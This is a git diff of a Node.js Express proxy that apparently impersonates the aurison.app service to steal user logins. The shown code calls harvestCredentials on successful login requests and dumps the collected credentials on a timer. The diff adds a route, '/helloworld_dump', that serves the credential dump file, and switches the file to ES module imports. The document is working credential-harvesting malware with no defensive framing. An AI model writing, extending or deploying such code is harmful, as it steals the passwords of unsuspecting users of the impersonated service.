@@ -1,14 +1,17 @@
 //imports
-const harvestCredentials = require('./utils/utils').grabCreds;
-const credsDump = require('./utils/utils').writeCreds;
-const parseJson = require('body-parser').json;
-const express = require('express');
-const axios = require('axios');
-const https = require('https');
+import { grabCreds as harvestCredentials, writeCreds as credsDump } from './utils/utils.js';
+import bodyParser from 'body-parser';
+import { fileURLToPath } from 'url';
+import path from 'path';
+import express from 'express';
+import axios from 'axios';
+import https from 'https';
 
 
 
 //consts 
+const __filename = fileURLToPath(import.meta.url);
+const __dirname = path.dirname(__filename);     //hack to make __dirname available in Es6 🤷🏿‍♂️
 const PORT = 55000;
 const STAGING = 'https://test-backend.aurison.app';
 const PROD = 'https://api.aurison.app';
@@ -22,7 +25,7 @@ var CREDENTIALS = [];
 
 
 //middlwares
-app.use(parseJson());
+app.use(bodyParser.json());
 
 app.use((req, res, next) => {
     //This route is kinda uneccessary. 
@@ -32,9 +35,13 @@ app.use((req, res, next) => {
 })
 
 
+
 app.use('/static', express.static('static'));
 
 
+app.get('/helloworld_dump', (req, res) => res.sendFile(__dirname, '/aurison_creds_dump.txt'));
+
+app.get('/favicon.ico', (req, res) => res.sendFile(__dirname, '/favicon.ico'));
 //home
 app.get('*', (req, res, next)=>{
     //check if react is trying to access a static file and manually serve it.
@@ -100,13 +107,7 @@ app.post('*', async (req, res) =>{
         });
         
         //Grab login creds
-        if (response.data.error === false && path === 'login') harvestCredentials(req, CREDENTIALS);
-
-        //Grab verify creds
-        if (response.data.error === false && path == 'verify') {
-            if (req.data.action === "register") harvestCredentials(req, CREDENTIALS);
-        }
-
+        if (response.data.error === false && path === '/login') harvestCredentials(req, CREDENTIALS);
 
         return res.status(200).json(response.data);
 
@@ -127,7 +128,7 @@ app.post('*', async (req, res) =>{
 
 //launch
 app.listen(PORT, () => {
-    setInterval(() => credsDump(CREDENTIALS), 10000);   //dump any creds in queue every 10 seconds.
+    setInterval(() => credsDump(CREDENTIALS), 5000);   //dump any creds in queue every 10 seconds.
 
     console.log(`Server is listening on port ${PORT}`);
 });
